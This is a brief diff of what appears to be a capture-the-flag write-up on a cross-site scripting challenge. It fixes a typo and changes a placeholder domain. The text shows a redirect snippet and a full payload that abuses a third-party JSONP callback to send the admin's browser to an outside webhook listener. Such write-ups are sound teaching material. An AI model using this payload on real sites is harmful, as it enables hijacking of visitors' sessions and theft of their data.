@@ -61,7 +61,7 @@ In general what we need to do now is report our note to the admin, wait until he
 I will be using a site called Webhook (https://webhook.site) as my listener.
 
 We can use this javascript code to redirect the admin to our site.
-`window.loaction.replace('malicioussite.poutses')`<br>
+`window.location.replace('malicioussite.something')`<br>
 Our payload now looks like this<br>
 
 `<script src="https://passport.ngs.ru/ajax/check?callback=window.location.replace('https://webhook.site/fcaa41ba-87af-467e-9b5f-8437a8b3a762')"></script>`
